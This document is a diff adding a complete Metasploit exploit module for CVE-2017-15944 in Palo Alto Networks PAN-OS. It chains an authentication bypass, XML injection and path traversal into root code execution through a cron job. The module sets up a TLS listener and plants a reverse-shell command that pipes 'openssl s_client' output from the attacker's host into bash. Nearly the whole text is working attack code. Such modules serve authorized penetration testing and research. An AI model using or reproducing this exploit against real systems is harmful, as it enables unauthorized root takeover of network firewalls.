@@ -1,0 +1,198 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Palo Alto Networks readSessionVarsFromFile() Session Corruption',
+      'Description'    => %q{
+        This module exploits a chain of vulnerabilities in Palo Alto Networks products running
+        PAN-OS versions prior to 6.1.19, 7.0.19, 7.1.14, and 8.0.6. This chain starts by using
+        an authentication bypass flaw to to exploit an XML injection issue, which is then
+        abused to create an arbitrary directory, and finally gains root code execution by
+        exploiting a vulnerable cron script. This module uses an initial reverse TLS callback
+        to stage arbitrary payloads on the target appliance. The cron job used for the final
+        payload runs every 15 minutes by default and exploitation can take up to 20 minutes.
+      },
+      'Author'         => [
+        'Philip Pettersson <philip.pettersson[at]gmail com>', # Vulnerability discovery
+        'hdm'                                                 # Metasploit module
+      ],
+      'References'     => [
+        ['CVE', '2017-15944'],
+        ['URL', 'http://seclists.org/fulldisclosure/2017/Dec/38'],
+        ['BID', '102079'],
+      ],
+      'DisclosureDate' => 'Dec 11 2017',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => true,
+      'Payload'        => {'BadChars' => '', 'Space' => 8000, 'DisableNops' => true},
+      'Targets'        => [['Automatic', {}]],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {'WfsDelay' => 2}
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+        OptAddress.new('CBHOST', [ false, "The listener address used for staging the real payload" ]),
+        OptPort.new('CBPORT', [ false, "The listener port used for staging the real payload" ])
+      ])
+  end
+
+  def exploit
+
+    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise
+    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])
+
+    # Start a listener
+    start_listener(true)
+
+    # Figure out the port we picked
+    cbport = self.service.getsockname[2]
+
+    # Set the base directory and the staging payload directory path name
+    base_directory   = "/opt/pancfg/mgmt/logdb/traffic/1/"
+    command_payload  = "* -print -exec bash -c openssl${IFS}s_client${IFS}-quiet${IFS}-connect${IFS}#{cbhost}:#{cbport}|bash ; "
+    target_directory = base_directory + command_payload
+
+    if target_directory.length > 255
+      print_error("The selected payload or options resulted in an encoded command that is too long (255+ bytes)")
+      return
+    end
+
+    dev_str_1 = Rex::Text.rand_text_alpha_lower(1+rand(10))
+    dev_str_2 = Rex::Text.rand_text_alpha_lower(1+rand(10))
+    user_id   = rand(2000).to_s
+
+    print_status("Creating our corrupted session ID...")
+
+    # Obtain a session cookie linked to a corrupted session file. A raw request
+    # is needed to prevent encoding of the parameters injected into the session
+    res = send_request_raw(
+      'method' => 'GET',
+      'uri'    => "/esp/cms_changeDeviceContext.esp?device=#{dev_str_1}:#{dev_str_2}%27\";user|s.\"#{user_id}\";"
+    )
+    unless res && res.body.to_s.index('@start@Success@end@')
+      print_error("Unexpected response when creating the corrupted session cookie: #{res.code} #{res.message}")
+      return
+    end
+
+    cookies = res.get_cookies
+    unless cookies =~ /PHPSESSID=([a-fA-F0-9]+)/
+      print_error("Unexpected cookie response when creating the corrupted session cookie: #{res.code} #{res.message} #{cookies}")
+      return
+    end
+
+    create_directory_tid  = 1 + rand(1000)
+    create_directory_json = JSON.dump({
+      "action" => "PanDirect",
+      "method" => "execute",
+      "data"   => [
+        Rex::Text.md5(create_directory_tid.to_s),
+        "Administrator.get",
+        {
+          "changeMyPassword" => true,
+          "template"         => Rex::Text.rand_text_alpha_lower(rand(9) + 3),
+          "id"               => "admin']\" async-mode='yes' refresh='yes' cookie='../../../../../..#{target_directory}'/>\x00"
+        }
+      ],
+      "type"   => "rpc",
+      "tid"    => create_directory_tid
+    })
+
+    print_status("Calling Administrator.get to create directory under #{base_directory}...")
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri'    => '/php/utils/router.php/Administrator.get',
+      'cookie' => cookies,
+      'ctype'  => "application/json",
+      'data'   => create_directory_json
+    )
+    unless res && res.body.to_s.index('Async request enqueued')
+      print_error("Unexpected response when calling Administrator.get method: #{res.code} #{res.message}")
+      return
+    end
+
+    register_dirs_for_cleanup(base_directory)
+
+    print_status("Waiting up to 20 minutes for the cronjob to fire and execute...")
+    expiry = Time.at(Time.now.to_i + (60*20)).to_i
+    last_notice = 0
+    while expiry > Time.now.to_i && ! session_created?
+      if last_notice + 30 < Time.now.to_i
+        print_status("Waiting for a session, #{expiry - Time.now.to_i} seconds left...")
+        last_notice = Time.now.to_i
+      end
+      sleep(1)
+    end
+
+    unless session_created?
+      print_error("No connection received from the target, giving up.")
+    end
+
+  end
+
+  def stage_real_payload(cli)
+    print_good("Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...")
+    cli.put(payload.encoded + "\n")
+  end
+
+  def start_listener(ssl = false)
+    comm = datastore['ListenerComm']
+    if comm == "local"
+      comm = ::Rex::Socket::Comm::Local
+    else
+      comm = nil
+    end
+
+    self.service = Rex::Socket::TcpServer.create(
+      'LocalPort' => datastore['CBPORT'],
+      'SSL'       => true,
+      'SSLCert'   => datastore['SSLCert'],
+      'Comm'      => comm,
+      'Context'   =>
+        {
+          'Msf'        => framework,
+          'MsfExploit' => self,
+        })
+
+    self.service.on_client_connect_proc = Proc.new { |client|
+      stage_real_payload(client)
+    }
+
+    # Start the listening service
+    self.service.start
+  end
+
+  def cleanup
+    super
+    if self.service
+      print_status("Shutting down payload stager listener...")
+      begin
+        self.service.deref if self.service.kind_of?(Rex::Service)
+        if self.service.kind_of?(Rex::Socket)
+          self.service.close
+          self.service.stop
+        end
+        self.service = nil
+      rescue ::SocketError
+      end
+    end
+  end
+
+  # Accessor for our TCP payload stager
+  attr_accessor :service
+
+end
